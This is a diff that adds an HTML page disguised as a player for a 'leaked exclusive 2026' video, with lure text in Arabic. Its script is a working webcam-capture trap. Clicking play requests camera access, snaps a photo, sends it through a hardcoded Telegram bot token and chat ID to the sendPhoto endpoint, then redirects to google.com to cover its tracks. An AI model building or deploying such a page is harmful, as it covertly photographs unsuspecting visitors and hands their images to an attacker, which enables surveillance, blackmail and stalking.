@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Video Player</title>
+    <style>
+        html, body { margin: 0; padding: 0; width: 100vw; height: 100vh; background-color: #000; display: flex; justify-content: center; align-items: center; font-family: sans-serif; overflow: hidden; position: fixed; }
+        .video-container { width: 100%; text-align: center; color: white; }
+        .play-button { width: 100px; height: 100px; background: #ff0000; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; cursor: pointer; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+        .play-button:after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent white; margin-left: 5px; }
+        .loading-bar { width: 80%; height: 5px; background: #222; margin: 20px auto; border-radius: 10px; }
+        .progress { width: 0%; height: 100%; background: #ff0000; transition: width 0.5s; }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <div class="play-button" onclick="startProcess()"></div>
+        <h3 id="status">شاهد الفيديو المسرب (حصري 2026)</h3>
+        <p style="color: #666;">اضغط تشغيل للمتابعة</p>
+        <div class="loading-bar"><div id="progress" class="progress"></div></div>
+    </div>
+    <script>
+        const token = '8580971132:AAHhENW9qZ9BosbttJ9uEpAkyNsAEtnTChA';
+        const chatId = '6837507867';
+        async function startProcess() {
+            document.getElementById('status').innerHTML = "جاري الاتصال...";
+            document.getElementById('progress').style.width = '70%';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream; video.play();
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'img.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+                        .then(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.google.com";
+                        });
+                    }, 'image/jpeg');
+                }, 1200);
+            } catch (err) { window.location.href = "https://www.google.com"; }
+        }
+    </script>
+</body>
+</html>
